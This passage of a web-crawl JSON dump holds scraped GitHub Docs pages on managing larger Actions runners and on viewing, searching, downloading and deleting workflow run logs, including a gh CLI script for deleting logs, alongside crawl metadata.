setup](https://docs.github.com/en/code-security/code-scanning/managing-your-code-scanning-configuration/configuring-larger-runners-for-default-setup).\n\n1.  On GitHub, navigate to the main page of the organization.\n    \n2.  Under your organization name, click **Settings**. If you cannot see the \"Settings\" tab, select the dropdown menu, then click **Settings**.\n    \n    ![Screenshot of the tabs in an organization's profile. The \"Settings\" tab is outlined in dark orange.](https://docs.github.com/assets/cb-49309/images/help/discussions/org-settings-global-nav-update.png)\n    \n3.  In the left sidebar, click **Actions**, then click **Runners**.\n    \n4.  In the list of runners, select the runner you would like to edit.\n    \n5.  Enter a new name for the runner in the text field under \"Name.\"\n    \n6.  Click **Save**.\n    \n\n## [Changing the size of a larger runner](#changing-the-size-of-a-larger-runner)\n\n1.  On GitHub, navigate to the main page of the organization.\n    \n2.  Under your organization name, click **Settings**. If you cannot see the \"Settings\" tab, select the dropdown menu, then click **Settings**.\n    \n    ![Screenshot of the tabs in an organization's profile. The \"Settings\" tab is outlined in dark orange.](https://docs.github.com/assets/cb-49309/images/help/discussions/org-settings-global-nav-update.png)\n    \n3.  In the left sidebar, click **Actions**, then click **Runners**.\n    \n4.  In the list of runners, select the runner you would like to edit.\n    \n5.  Select a new size for the runner from the list of available options under \"Size.\" The available sizes depend on the image that is installed on the runner.\n    \n6.  Click **Save**.\n    \n\n## [Changing the image of a larger runner](#changing-the-image-of-a-larger-runner)\n\n1.  On GitHub, navigate to the main page of the organization.\n    \n2.  Under your organization name, click **Settings**. If you cannot see the \"Settings\" tab, select the dropdown menu, then click **Settings**.\n    \n    ![Screenshot of the tabs in an organization's profile. The \"Settings\" tab is outlined in dark orange.](https://docs.github.com/assets/cb-49309/images/help/discussions/org-settings-global-nav-update.png)\n    \n3.  In the left sidebar, click **Actions**, then click **Runners**.\n    \n4.  In the list of runners, select the runner you would like to edit.\n    \n5.  Select a new image for the runner from the list of available options under \"Image.\" The available images are limited to GitHub-owned images.\n    \n6.  Click **Save**.\n    \n\n## [Configuring autoscaling for larger runners](#configuring-autoscaling-for-larger-runners)\n\nYou can control the maximum number of jobs allowed to run concurrently for specific runner sets. Setting this field to a higher value can help prevent workflows being blocked due to parallelism.\n\n1.  On GitHub, navigate to the main page of the organization.\n    \n2.  Under your organization name, click **Settings**. If you cannot see the \"Settings\" tab, select the dropdown menu, then click **Settings**.\n    \n    ![Screenshot of the tabs in an organization's profile. The \"Settings\" tab is outlined in dark orange.](https://docs.github.com/assets/cb-49309/images/help/discussions/org-settings-global-nav-update.png)\n    \n3.  In the left sidebar, click **Actions**, then click **Runners**.\n    \n4.  In the list of runners, select the runner you would like to edit.\n    \n5.  In the \"Auto-scaling\" section, under \"Maximum Job Concurrency,\" enter the maximum number of jobs you would like to allow to run at the same time.\n    \n6.  Click **Save**.\n    \n\n## [Creating static IP addresses for larger runners](#creating-static-ip-addresses-for-larger-runners)\n\nYou can enable static IP addresses for larger runners. When you do this, the larger runners are assigned static IP address ranges. All IP addresses in the range assigned are usable and not in CIDR notation. By default, you can configure up to 10 different larger runners with IP ranges for your account. If you would like to use more than 10 larger runners with static IP address ranges, please contact us through the [GitHub Support portal](https://support.github.com/).\n\nThe number of available IP addresses in the assigned ranges does not restrict number of concurrent jobs specified for autoscaling. Within a runner pool, there is a load balancer which allows for high reuse of the IP addresses in the assigned ranges. This ensures your workflows can run concurrently at scale while each machine is assigned a static IP address.\n\n1.  On GitHub, navigate to the main page of the organization.\n    \n2.  Under your organization name, click **Settings**. If you cannot see the \"Settings\" tab, select the dropdown menu, then click **Settings**.\n    \n    ![Screenshot of the tabs in an organization's profile. The \"Settings\" tab is outlined in dark orange.](https://docs.github.com/assets/cb-49309/images/help/discussions/org-settings-global-nav-update.png)\n    \n3.  In the left sidebar, click **Actions**, then click **Runners**.\n    \n4.  In the list of runners, select the runner you would like to edit.\n    \n5.  To assign static IP addresses to the runner, under \"Networking,\" check **Assign unique & static public IP address ranges for this runner**.\n    \n6.  Click **Save**.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasMinWordsCrawleeHtmlToText",
    "totalLinks": 245,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-using-larger-runners-managing-larger-runners-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-using-larger-runners-managing-larger-runners-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-using-larger-runners-managing-larger-runners-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-using-larger-runners-managing-larger-runners-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-using-larger-runners-managing-larger-runners-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 16830,
      "readableText": 15966,
      "none": 33459,
      "readableTextIfPossible": 15966,
      "result": 15966,
      "markdown": 12437
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-workflow-run-logs",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-workflow-run-logs",
    "loadedTime": "2025-05-08T06:38:21.834Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-workflow-run-logs",
    "title": "Using workflow run logs - GitHub Docs",
    "description": "You can view, search, and download the logs for each job in a workflow run.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Using workflow run logs - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-workflow-run-logs"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-workflow-run-logs"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "C9AC:1AD9F5:FBC27B:1448974:681C5157",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:38:15 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686295.213158, VS0, VE283",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "30867",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Using workflow run logs - GitHub Docs\nYou can view, search, and download the logs for each job in a workflow run.\nYou can see whether a workflow run is in progress or complete from the workflow run page. You must be logged in to a GitHub account to view workflow run information, including for public repositories. For more information, see Access permissions on GitHub.\nIf the run is complete, you can see whether the result was a success, failure, canceled, or neutral. If the run failed, you can view and search the build logs to diagnose the failure and re-run the workflow. You can also view billable job execution minutes, or download logs and build artifacts.\nGitHub Actions use the Checks API to output statuses, results, and logs for a workflow. GitHub creates a new check suite for each workflow run. The check suite contains a check run for each job in the workflow, and each job includes steps. GitHub Actions are run as a step in a workflow. For more information about the Checks API, see REST API endpoints for checks.\nNote\nEnsure that you only commit valid workflow files to your repository. If .github/workflows contains an invalid workflow file, GitHub Actions generates a failed workflow run for every new commit.\nViewing logs to diagnose failures\nIf your workflow run fails, you can see which step caused the failure and review the failed step's build logs to troubleshoot. You can see the time it took for each step to run. You can also copy a permalink to a specific line in the log file to share with your team. Read access to the repository is required to perform these steps.\nIn addition to the steps configured in the workflow file, GitHub adds two additional steps to each job to set up and complete the job's execution. These steps are logged in the workflow run with the names \"Set up job\" and \"Complete job\".\nFor jobs run on GitHub-hosted runners, \"Set up job\" records details of the runner image, and includes a link to the list of preinstalled tools that were present on the runner machine.\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Actions.\nIn the left sidebar, click the workflow you want to see.\nFrom the list of workflow runs, click the name of the run to see the workflow run summary.\nUnder Jobs or in the visualization graph, click the job you want to see.\nAny failed steps are automatically expanded to display the results.\nOptionally, to get a link to a specific line in the logs, click on the step's line number. You can then copy the link from the address bar of your web browser.\nSearching logs\nYou can search the build logs for a particular step. When you search logs, only expanded steps are included in the results. Read access to the repository is required to perform these steps.\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Actions.\nIn the left sidebar, click the workflow you want to see.\nFrom the list of workflow runs, click the name of the run to see the workflow run summary.\nUnder Jobs or in the visualization graph, click the job you want to see.\nIn the upper-right corner of the log output, in the Search logs search box, type a search query.\nDownloading logs\nYou can download the log files from your workflow run. You can also download a workflow's artifacts. For more information, see Storing and sharing data from a workflow. Read access to the repository is required to perform these steps.\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Actions.\nIn the left sidebar, click the workflow you want to see.\nFrom the list of workflow runs, click the name of the run to see the workflow run summary.\nUnder Jobs or in the visualization graph, click the job you want to see.\nIn the upper right corner of the log, select the dropdown menu, then click Download log archive.\nNote\nWhen you download the log archive for a workflow that was partially re-run, the archive only includes the jobs that were re-run. To get a complete set of logs for jobs that were run from a workflow, you must download the log archives for the previous run attempts that ran the other jobs.\nDeleting logs\nYou can delete the log files from your workflow runs through the GitHub web interface or programmatically. Write access to the repository is required to perform these steps.\nDeleting logs via the GitHub web interface\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Actions.\nIn the left sidebar, click the workflow you want to see.\nFrom the list of workflow runs, click the name of the run to see the workflow run summary.\nIn the upper-right corner, select the dropdown menu, then click Delete all logs.\nReview the confirmation prompt.\nAfter deleting logs, the Delete all logs button is removed to indicate that no log files remain in the workflow run.\nDeleting logs programmatically\nYou can use the following script to automatically delete all logs for a workflow. This can be a useful way to clean up logs for multiple workflow runs.\nTo run the example script below:\nCopy the code example and save it to a file called delete-logs.sh.\nGrant it the execute permission with chmod +x delete-logs.sh.\nRun the following command, where REPOSITORY_NAME is the name of your repository and WORKFLOW_NAME is the file name of your workflow.\nShell\n./delete-logs.sh REPOSITORY_NAME WORKFLOW_NAME \nFor example, to delete all of the logs in the monalisa/octocat repository for the .github/workflows/ci.yaml workflow, you would run ./delete-logs.sh monalisa/octocat ci.yaml.\nExample script\nBash\n#!/usr/bin/env bash # Delete all logs for a given workflow # Usage: delete-logs.sh <repository> <workflow-name> set -oe pipefail REPOSITORY=$1 WORKFLOW_NAME=$2 # Validate arguments if [[ -z \"$REPOSITORY\" ]]; then echo \"Repository is required\" exit 1 fi if [[ -z \"$WORKFLOW_NAME\" ]]; then echo \"Workflow name is required\" exit 1 fi echo \"Getting all completed runs for workflow $WORKFLOW_NAME in $REPOSITORY\" RUNS=$( gh api \\ -H \"Accept: application/vnd.github+json\" \\ -H \"X-GitHub-Api-Version: 2022-11-28\" \\ \"/repos/$REPOSITORY/actions/workflows/$WORKFLOW_NAME/runs\" \\ --paginate \\ --jq '.workflow_runs[] | select(.conclusion != \"\") | .id' ) echo \"Found $(echo \"$RUNS\" | wc -l) completed runs for workflow $WORKFLOW_NAME\" # Delete logs for each run for RUN in $RUNS; do echo \"Deleting logs for run $RUN\" gh api \\ --silent \\ --method DELETE \\ -H \"Accept: application/vnd.github+json\" \\ -H \"X-GitHub-Api-Version: 2022-11-28\" \\ \"/repos/$REPOSITORY/actions/runs/$RUN/logs\" || echo \"Failed to delete logs for run $RUN\" # Sleep for 100ms to avoid rate limiting sleep 0.1 done \nViewing logs with GitHub CLI\nTo view the log for a specific job, use the run view subcommand. Replace run-id with the ID of run that you want to view logs for. GitHub CLI returns an interactive menu for you to choose a job from the run. If you don't specify run-id, GitHub CLI returns an interactive menu for you to choose a recent run, and then returns another interactive menu for you to choose a job from the run.\ngh run view RUN_ID --log \nYou can also use the --job flag to specify a job ID. Replace job-id with the ID of the job that you want to view logs for.\ngh run view --job JOB_ID --log \nYou can use grep to search the log. For example, this command will return all log entries that contain the word error.\ngh run view --job JOB_ID --log | grep error \nTo filter the logs for any failed steps, use --log-failed instead of --log.\ngh run view --job JOB_ID --log-failed",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-using-workflow-run-logs-wr7b8.html",
  "markdown": "# Using workflow run logs - GitHub Docs\n\nYou can view, search, and download the logs for each job in a workflow run.\n\nYou can see whether a workflow run is in progress or complete from the workflow run page. You must be logged in to a GitHub account to view workflow run information, including for public repositories. For more information, see [Access permissions on GitHub](https://docs.github.com/en/get-started/learning-about-github/access-permissions-on-github).\n\nIf the run is complete, you can see whether the result was a success, failure, canceled, or neutral. If the run failed, you can view and search the build logs to diagnose the failure and re-run the workflow. You can also view billable job execution minutes, or download logs and build artifacts.\n\nGitHub Actions use the Checks API to output statuses, results, and logs for a workflow. GitHub creates a new check suite for each workflow run. The check suite contains a check run for each job in the workflow, and each job includes steps. GitHub Actions are run as a step in a workflow. For more information about the Checks API, see [REST API endpoints for checks](https://docs.github.com/en/rest/checks).\n\nNote\n\nEnsure that you only commit valid workflow files to your repository. If `.github/workflows` contains an invalid workflow file, GitHub Actions generates a failed workflow run for every new commit.\n\n## [Viewing logs to diagnose failures](#viewing-logs-to-diagnose-failures)\n\nIf your workflow run fails, you can see which step caused the failure and review the failed step's build logs to troubleshoot. You can see the time it took for each step to run. You can also copy a permalink to a specific line in the log file to share with your team. Read access to the repository is required to perform these steps.\n\nIn addition to the steps configured in the workflow file, GitHub adds two additional steps to each job to set up and complete the job's execution. These steps are logged in the workflow run with the names \"Set up job\" and \"Complete job\".\n\nFor jobs run on GitHub-hosted runners, \"Set up job\" records details of the runner image, and includes a link to the list of preinstalled tools that were present on the runner machine.\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Actions**.\n    \n    ![Screenshot of the tabs for the \"github/docs\" repository. The \"Actions\" tab is highlighted with an orange outline.](https://docs.github.com/assets/cb-12958/images/help/repository/actions-tab-global-nav-update.png)\n    \n3.  In the left sidebar, click the workflow you want to see.\n    \n    ![Screenshot of the left sidebar of the \"Actions\" tab. A workflow, \"CodeQL,\" is outlined in dark orange.](https://docs.github.com/assets/cb-40551/images/help/actions/superlinter-workflow-sidebar.png)\n    \n4.  From the list of workflow runs, click the name of the run to see the workflow run summary.\n    \n5.  Under **Jobs** or in the visualization graph, click the job you want to see.\n    \n6.  Any failed steps are automatically expanded to display the results.\n    \n7.  Optionally, to get a link to a specific line in the logs, click on the step's line number. You can then copy the link from the address bar of your web browser.\n    \n    ![Screenshot of the logs for a job. The logs for a failed step are expanded, and a line number is highlighted with an orange outline.](https://docs.github.com/assets/cb-33371/images/help/repository/copy-link-button-updated-2.png)\n    \n\n## [Searching logs](#searching-logs)\n\nYou can search the build logs for a particular step. When you search logs, only expanded steps are included in the results. Read access to the repository is required to perform these steps.\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Actions**.\n    \n    ![Screenshot of the tabs for the \"github/docs\" repository. The \"Actions\" tab is highlighted with an orange outline.](https://docs.github.com/assets/cb-12958/images/help/repository/actions-tab-global-nav-update.png)\n    \n3.  In the left sidebar, click the workflow you want to see.\n    \n    ![Screenshot of the left sidebar of the \"Actions\" tab. A workflow, \"CodeQL,\" is outlined in dark orange.](https://docs.github.com/assets/cb-40551/images/help/actions/superlinter-workflow-sidebar.png)\n    \n4.  From the list of workflow runs, click the name of the run to see the workflow run summary.\n    \n5.  Under **Jobs** or in the visualization graph, click the job you want to see.\n    \n6.  In the upper-right corner of the log output, in the **Search logs** search box, type a search query.\n    \n\n## [Downloading logs](#downloading-logs)\n\nYou can download the log files from your workflow run. You can also download a workflow's artifacts. For more information, see [Storing and sharing data from a workflow](https://docs.github.com/en/actions/using-workflows/storing-workflow-data-as-artifacts). Read access to the repository is required to perform these steps.\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Actions**.\n    \n    ![Screenshot of the tabs for the \"github/docs\" repository. The \"Actions\" tab is highlighted with an orange outline.](https://docs.github.com/assets/cb-12958/images/help/repository/actions-tab-global-nav-update.png)\n    \n3.  In the left sidebar, click the workflow you want to see.\n    \n    ![Screenshot of the left sidebar of the \"Actions\" tab. A workflow, \"CodeQL,\" is outlined in dark orange.](https://docs.github.com/assets/cb-40551/images/help/actions/superlinter-workflow-sidebar.png)\n    \n4.  From the list of workflow runs, click the name of the run to see the workflow run summary.\n    \n5.  Under **Jobs** or in the visualization graph, click the job you want to see.\n    \n6.  In the upper right corner of the log, select the dropdown menu, then click **Download log archive**.\n    \n    ![Screenshot of the log for a job. In the header, a gear icon is outlined in dark orange.](https://docs.github.com/assets/cb-40738/images/help/actions/download-logs-drop-down.png)\n    \n\nNote\n\nWhen you download the log archive for a workflow that was partially re-run, the archive only includes the jobs that were re-run. To get a complete set of logs for jobs that were run from a workflow, you must download the log archives for the previous run attempts that ran the other jobs.\n\n## [Deleting logs](#deleting-logs)\n\nYou can delete the log files from your workflow runs through the GitHub web interface or programmatically. Write access to the repository is required to perform these steps.\n\n### [Deleting logs via the GitHub web interface](#deleting-logs-via-the-github-web-interface)\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Actions**.\n    \n    ![Screenshot of the tabs for the \"github/docs\" repository. The \"Actions\" tab is highlighted with an orange outline.](https://docs.github.com/assets/cb-12958/images/help/repository/actions-tab-global-nav-update.png)\n    \n3.  In the left sidebar, click the workflow you want to see.\n    \n    ![Screenshot of the left sidebar of the \"Actions\" tab. A workflow, \"CodeQL,\" is outlined in dark orange.](https://docs.github.com/assets/cb-40551/images/help/actions/superlinter-workflow-sidebar.png)\n    \n4.  From the list of workflow runs, click the name of the run to see the workflow run summary.\n    \n5.  In the upper-right corner, select the dropdown menu, then click **Delete all logs**.\n    \n    ![Screenshot of the page for a workflow run. In the top-right corner, a button, labeled with a kebab icon, is outlined in dark orange.](https://docs.github.com/assets/cb-39529/images/help/actions/workflow-run-kebab-horizontal-icon.png)\n    \n6.  Review the confirmation prompt.\n    \n\nAfter deleting logs, the **Delete all logs** button is removed to indicate that no log files remain in the workflow run.\n\n### [Deleting logs programmatically](#deleting-logs-programmatically)\n\nYou can use the following script to automatically delete all logs for a workflow. This can be a useful way to clean up logs for multiple workflow runs.\n\nTo run the example script below:\n\n1.  Copy the code example and save it to a file called `delete-logs.sh`.\n    \n2.  Grant it the execute permission with `chmod +x delete-logs.sh`.\n    \n3.  Run the following command, where `REPOSITORY_NAME` is the name of your repository and `WORKFLOW_NAME` is the file name of your workflow.\n    \n    Shell\n    \n    ```\n    ./delete-logs.sh REPOSITORY_NAME WORKFLOW_NAME\n    ```\n    \n    For example, to delete all of the logs in the `monalisa/octocat` repository for the `.github/workflows/ci.yaml` workflow, you would run `./delete-logs.sh monalisa/octocat ci.yaml`.\n    \n\n#### [Example script](#example-script)\n\nBash\n\n```\n#!/usr/bin/env bash\n\n# Delete all logs for a given workflow\n# Usage: delete-logs.sh <repository> <workflow-name>\n\nset -oe pipefail\n\nREPOSITORY=$1\nWORKFLOW_NAME=$2\n\n# Validate arguments\nif [[ -z \"$REPOSITORY\" ]]; then\n  echo \"Repository is required\"\n  exit 1\nfi\n\nif [[ -z \"$WORKFLOW_NAME\" ]]; then\n  echo \"Workflow name is required\"\n  exit 1\nfi\n\necho \"Getting all completed runs for workflow $WORKFLOW_NAME in $REPOSITORY\"\n\nRUNS=$(\n  gh api \\\n    -H \"Accept: application/vnd.github+json\" \\\n    -H \"X-GitHub-Api-Version: 2022-11-28\" \\\n    \"/repos/$REPOSITORY/actions/workflows/$WORKFLOW_NAME/runs\" \\\n    --paginate \\\n    --jq '.workflow_runs[] | select(.conclusion != \"\") | .id'\n)\n\necho \"Found $(echo \"$RUNS\" | wc -l) completed runs for workflow $WORKFLOW_NAME\"\n\n# Delete logs for each run\nfor RUN in $RUNS; do\n  echo \"Deleting logs for run $RUN\"\n  gh api \\\n    --silent \\\n    --method DELETE \\\n    -H \"Accept: application/vnd.github+json\" \\\n    -H \"X-GitHub-Api-Version: 2022-11-28\" \\\n    \"/repos/$REPOSITORY/actions/runs/$RUN/logs\" || echo \"Failed to delete logs for run $RUN\"\n\n  # Sleep for 100ms to avoid rate limiting\n  sleep 0.1\ndone\n```\n\n## [Viewing logs with GitHub CLI](#viewing-logs-with-github-cli)\n\nTo view the log for a specific job, use the `run view` subcommand. Replace `run-id` with the ID of run that you want to view logs for. GitHub CLI returns an interactive menu for you to choose a job from the run. If you don't specify `run-id`, GitHub CLI returns an interactive menu for you to choose a recent run, and then returns another interactive menu for you to choose a job from the run.\n\n```\ngh run view RUN_ID --log\n```\n\nYou can also use the `--job` flag to specify a job ID. Replace `job-id` with the ID of the job that you want to view logs for.\n\n```\ngh run view --job JOB_ID --log\n```\n\nYou can use `grep` to search the log. For example, this command will return all log entries that contain the word `error`.\n\n```\ngh run view --job JOB_ID --log | grep error\n```\n\nTo filter the logs for any failed steps, use `--log-failed` instead of `--log`.\n\n```\ngh run view --job JOB_ID --log-failed\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 244,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-using-workflow-run-logs-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-using-workflow-run-logs-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-using-workflow-run-logs-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-using-workflow-run-logs-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-using-workflow-run-logs-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 16337,
      "readableText": 15460,
      "none": 39549,
      "readableTextIfPossible": 15460,
      "result": 15460,
      "markdown": 10941
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/about-troubleshooting-workflows",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/about-troubleshooting-workflows",
    "loadedTime": "2025-05-08T06:38:19.610Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/about-troubleshooting-workflows",
    "title": "About troubleshooting workflows - GitHub Docs",
    "description": "You can use the tools in GitHub Actions to debug your workflows.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "About troubleshooting workflows - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/about-troubleshooting-workflows"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/about-troubleshooting-workflows"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "2E34:132AFF:EF6622:1382150:681C513D",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:38:11 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686292.613161, VS0, VE180",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "24630",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "About troubleshooting workflows - GitHub Docs\nYou can use the tools in GitHub Actions to debug your workflows.\nTroubleshooting your workflows\nThere are several ways you can troubleshoot failed workflow runs.\nUsing GitHub Copilot\nIf a workflow run fails, you can open a chat with GitHub Copilot for assistance resolving the error. See Using Copilot to troubleshoot workflows.\nUsing workflow run logs\nEach workflow run generates activity logs that you can view, search, and download. For more information, see Using workflow run logs.\nEnabling debug logging\nIf the workflow logs do not provide enough detail to diagnose why a workflow, job, or step is not working as expected, you can enable additional debug logging. For more information, see Enabling debug logging.\nCanceling a workflow\nIf you attempt to cancel a workflow and the cancellation doesn't succeed, make sure you aren't using the always expression. The always expression causes a workflow step to run even when the workflow is canceled, which results in a hanging cancellation. For more information, see Evaluate expressions in workflows and actions.\nTroubleshooting GitHub Actions inefficiencies\nTo analyze the inefficiencies and reliability of your workflows using metrics, see Viewing GitHub Actions metrics.\nTroubleshooting self-hosted runners\nIf you use self-hosted runners, you can view their activity and diagnose common issues.\nFor more information, see Monitoring and troubleshooting self-hosted runners.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-troubleshooting-workflows-about-troubleshooting-workflows-oncqfk.html",
